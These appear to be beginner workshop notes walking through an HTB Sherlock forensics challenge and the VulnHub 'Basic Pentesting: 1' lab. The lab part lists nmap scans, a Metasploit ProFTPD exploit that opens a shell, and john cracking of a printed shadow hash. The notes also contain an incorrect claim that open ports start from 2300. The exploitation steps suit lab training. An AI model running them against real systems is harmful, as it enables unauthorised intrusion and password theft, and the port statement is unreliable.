# Hacking 101 - HTB Workshop

Hack The Box (HTB) is a platform that provides realistic penetration testing labs and challenges, allowing users to practice their cybersecurity skills in a safe environment. The platform offers a wide range of challenges, from web exploitation to reverse engineering, aimed at both beginners and experienced professionals.

## HTB Sherlocks - 'Noted' Challenge

[HTB Sherlocks - Noted](<https://app.hackthebox.com/sherlocks/Noted>)

### Overview

The 'Noted' challenge is a cyber sleuthing and analysis challenge that focuses more on Digital Forensics and Incident Response (DFIR) techniques. In this workshop, we will walk through the steps to solve this challenge.

### Instructions

1. Open everything with grep "**aws**" [**i**]. Go into the folder and then run:
    ```bash
    cat * | grep -i "aws"
    ```

2. Open the `session.xml` file to instantly get the filename and path.

3. Open the `LootANDPurge` file to directly access the zip file.

4. For UTC timestamp conversion, follow these steps:

    a. Open `time.txt` to obtain two values.

    b. Use the following Python formula to convert the timestamps:
    ```python
    import datetime

    timestamp_low = -1354503710
    timestamp_high = 31047188

    full_timestamp = (timestamp_high << 32) | (timestamp_low & 0xFFFFFFFF)

    timestamp_seconds = full_timestamp / 10**7
    timestamp = datetime.datetime(1601, 1, 1) + datetime.timedelta(seconds=timestamp_seconds)

    print(timestamp)
    ```
    Replace `timestamp_low` and `timestamp_high` with the obtained values.

#### Additional Steps

After obtaining the timestamp, proceed with the following steps:

1. Search on Pastebin to find the Ethereum wallet information.
2. Provide the Tor email address as required.

By following these steps, you will progress through the 'Noted' challenge on HTB Sherlocks.


## Offensive Security: Basic Pentesting: 1

Link to Challenge: [Basic Pentesting: 1 ~ VulnHub](<https://vulnhub.com/entry/basic-pentesting-1,216/>)

### Ports

- Ports are gateways to protocols and are managed by the operating system.
- There are 65,535 possible port numbers, with around 1200 commonly used ports and open ports starting from 2300 onwards.

### Downloads

1. VirtualBox: [Downloads – Oracle VM VirtualBox](<https://www.virtualbox.org/wiki/Downloads>)
2. Kali Linux: [Get Kali | Kali Linux](<https://www.kali.org/get-kali/#kali-virtual-machines>)
3. Target Machine: [Basic Pentesting: 1 ~ VulnHub](<https://vulnhub.com/entry/basic-pentesting-1,216/>)

### Steps

1. Find the Host IP using `ifconfig` or `ip addr` (under eth0).
2. Use `netdiscover -r <ip>/<subnet>` to find IP and MAC addresses of devices in the network.
   - Target PC is usually under vendor 'PCS Systemtechnik GmbH'.
   - Note down the target PC's IP.
3. Use nmap to find open ports on the target PC:
- `nmap <targetIP>`
 - `nmap -sV <targetIP>`
- `nmap -sV -sC <targetIP>`
- `nmap -sV <targetIP> -vv`
4. Check each port for vulnerabilities.
5. Exploit the vulnerable FTP port using msfconsole:
   ```
      bash
      msfconsole
      search proftpd
      use 5
      set RHOSTS <TARGET_IP>
      set LHOST <your_ip>
      exploit
   ```
6. You are basically inside the laptop now. However, if you still want to find the password, navigate to /etc/ and decrypt the shadow file using john.
```
		==marlinspike:\$6\$wQb5nV3T$xB2WO/jOkbn4t1RUILrckw69LR/0EMtUbFFCYpM3MUHVmtyYW9.ov/aszTpWhLaC2x6Fvy5tpUUxQbUhCKbl4/==
john <file_name>
john --show <file_name>
```

## Term-GPT
- nmap :
		- Network mapping
		- Find all devices within the same network using your ip
- -sV : Show version
- -sC : Script scan using default set of scripts